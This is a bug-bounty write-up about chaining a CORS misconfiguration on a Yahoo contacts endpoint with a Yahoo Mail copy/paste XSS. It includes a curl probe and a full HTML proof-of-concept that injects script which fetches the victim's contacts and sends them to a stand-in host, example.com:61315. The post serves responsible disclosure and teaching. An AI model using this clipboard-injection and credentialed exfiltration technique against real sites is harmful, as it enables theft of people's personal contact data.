---
layout: post
title: "Chaining Bugs to Steal Yahoo Contacts!"
author: Corben Leo
---
### &#x1F468;&#x1F3FB;&#x200D;&#x1F4BB;&nbsp;Introduction & Background:
This is a write-up of how I chained two vulnerabilities (an XSS and a CORS misconfiguration) that allowed me to steal contacts from a victim's contact book. This data included: names, phone numbers, addresses, etc. 

#### <font color="#129AC8">&#x2717;</font> Cross-Origin-Resource Sharing
> Cross-Origin Resource Sharing (CORS) is a mechanism that uses additional HTTP headers to let a user agent gain permission to access selected resources from a server on a different origin (domain) than the site currently in use.

Browsers enforce the <a href="https://en.wikipedia.org/wiki/Same-origin_policy" rel="noopener noreferrer" target="_blank"><font id="highlighter">Same-Origin Policy</font></a>, meaning that data on a site is only accessible from the same domain and port, unless there is a CORS configuration. This allows data to be shared with other sites.

#### <font color="#129AC8">&#x2717;</font> Cross-Site Scripting:
XSS is a client-side code injection attack that allows an attacker to insert scripts (such as javascript) into a vulnerable application. If you don't know what it is, you should. 
<br><br>

### &#x1F4A3; The Bugs:
#### <i class="fa fa-diamond" style="color:#129AC8" aria-hidden="true"></i> Bug #1: A CORS Misconfiguration in http://proddata.xobni.yahoo.com
I was browsing through various requests made to *.yahoo.com subdomains logged in the "<font id="highlighter2">Target</font>" tab of Burp Suite. I came across the subdomain proddata.xobni.yahoo.com and was intrigued by the name. There were only a few requests logged, but all to the same endpoint: `https://proddata.xobni.yahoo.com/v4/contacts`. This endpoint contains **every** contact you have in your Contact Book via a single `GET` request. I noticed the origin `https://mail.yahoo.com` was being reflected back in the `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true` header. I tried modifying the origin to many different payloads that I thought may work and be reflected, however none were reflected back. I then tried to send a different Yahoo! subdomain as the origin, rather than the `mail.yahoo.com` one. 
```
curl 'https://proddata.xobni.yahoo.com/v4/contacts' -s -H 'Origin: https://hackerone-cdl.yahoo.com' --head
```
Response:
```
Access-Control-Allow-Origin: https://hackerone-cdl.yahoo.com
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Access-Control-Allow-Credentials: true

```
It accepted any *.yahoo.com subdomain in the origin and reflected it back in the ACAO with `Allow-Credentials: true`. This meant if I could find an XSS on *.yahoo.com, I could leverage it to steal contacts.  
<br>
#### <i class="fa fa-diamond" style="color:#129AC8" aria-hidden="true"></i> Bug #2: An XSS in Yahoo! Mail
A few days passed and I still hadn't found an XSS. Then I saw a tweet from Enguerran Gillier (<a href="https://twitter.com/opnsec" _target="blank" rel="noopener noreferrer">@opnsec</a>) regarding a wontfix Copy+Paste XSS he had found in Yahoo Mail. I quickly wget'd that POC from his server and edited it to fit my needs. (Turns out after reporting the chained bugs, the XSS <font id="highlighter">wasn't</font> marked as a wontfix and there was some miscommunication, so lucky me!). It required more user-interaction than I had wanted, but I didn't care, I just wanted to chain them and report them as soon as possible. 

### &#x1F4B0; The Grand Finale
This was my proof-of-concept, that required a logged in user to copy any text from this page and paste it into Yahoo Mail. 
```html
<!doctype html>
  <head>
    <title>Yahoo CORS Misconfiguration</title>
  </head>
  <body>
    <h1>Yahoo CORS Misconfiguration</h1>
    <p>Stealing Contact information via CORS Misconfiguration + Yahoo Mail XSS via Copy/Paste</p>
    <h3>Prerequisites :</h3>
    - Tested on Windows 10 with Firefox 56, Chrome 62, Edge<br/>
    <h3>Instructions :</h3>
    1. Select any text in this page and copy it using ctrl-C or right click -> copy <br/>
    <span>Copy status : </span><span id="copied">not copied yet</span> <br/>
    2. Go to Yahoo Mail, compose a new email and paste inside the email body<br/>
    3. All of your contact's information will be sent to my server on port 61315  
  <script>
  document.addEventListener('copy', function(e){
  	e.clipboardData.setData('text/plain', '');
  	e.clipboardData.setData('text/html','<div id="enhancr2_a" class="yahoo-link-enhancr-card">xxx</div><img src="x" onerror="document.write(\'&lt;script&gt;var xhttp=new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200) {document.location=&#x22;http://example.com:61315&#x22;+escape(this.responseText);}};xhttp.open(&#x22;GET&#x22;,&#x22;https://proddata.xobni.yahoo.com/v4/contacts&#x22;,true);xhttp.withCredentials = true;xhttp.send();&lt;/script&gt;\');">');
  	e.preventDefault();
  	document.getElementById("copied").textContent = "SUCCESSFULLY COPIED"
  });
  </script>
```
<br>
Proof-of-Concept Video:<br>
<iframe width="560" height="315" src="https://www.youtube.com/embed/lK23tBEVKxU" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
<br>
<h2><u>Timeline</u></h2>
- (11/8/2017) Reported to Yahoo! via HackerOne
- (11/9/2017) Confirmed & awarded $150 on Triage
- (11/15/2017) Vulnerability Patched
- (12/10/2017) Awarded a $1,850 bounty (making the entire bounty $2,000)
<br><br>This was a fun report for me and I hoped you enjoyed it as well!<br>Thanks for reading,<br><br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/sxcurity"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
